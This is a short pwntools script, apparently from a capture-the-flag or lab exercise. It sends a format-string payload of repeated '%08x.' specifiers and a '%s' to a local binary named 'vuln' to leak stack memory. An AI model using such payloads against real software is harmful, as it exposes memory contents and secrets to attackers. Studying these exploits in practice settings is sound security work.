from pwn import *

p = process('./vuln')
payload = b'%08x.'*36 + b'%s'
p.sendline(payload)
res = p.recvall()
print(res)
